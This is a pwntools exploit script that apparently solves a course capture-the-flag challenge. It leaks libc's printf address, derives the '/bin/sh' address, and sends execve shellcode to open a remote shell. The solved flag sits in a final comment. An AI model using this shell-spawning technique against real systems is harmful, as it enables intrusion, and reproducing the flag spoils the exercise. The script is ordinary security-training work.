from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./back_to_glibc"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1292
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b main
#     continue
# ''')

print(p.recvuntil(b": ").decode())
libc_printf_addr = u64(p.recv(8))
log.info(f"Receiving leaked printf address: {libc_printf_addr}")

libc = ELF("./libc.so.6")
libc_printf_offset = libc.symbols.printf
libc_base_addr = libc_printf_addr - libc_printf_offset
libc_binsh_addr = libc_base_addr + next(libc.search(b"/bin/sh"))

shellcode = asm('''
    xor rdx, rdx      # rdx = NULL (envp pointer)
    mov rdi, {}       # rdi = address of "/bin/sh" string in libc (pathname pointer)
    push rdi          # Push string address onto stack for argv[0]
    push rdx          # Push NULL onto stack for argv[1]
    mov rsi, rsp      # rsi = address of argv array ["/bin/sh", NULL] (argv pointer)
    mov rax, 0x3b     # execve syscall number
    syscall           # Call execve(rdi, rsi, rdx)
'''.format(libc_binsh_addr), arch='amd64')

print(p.recvuntil(b"?\n").decode())
p.send(shellcode)
log.info(f"Sending shellcode in raw bytes: {shellcode}")

p.interactive()

# flag{y0u_r3_gonna_be_us1ng_gl1bc_4_l0t!_9aebd0bd21031cd2}
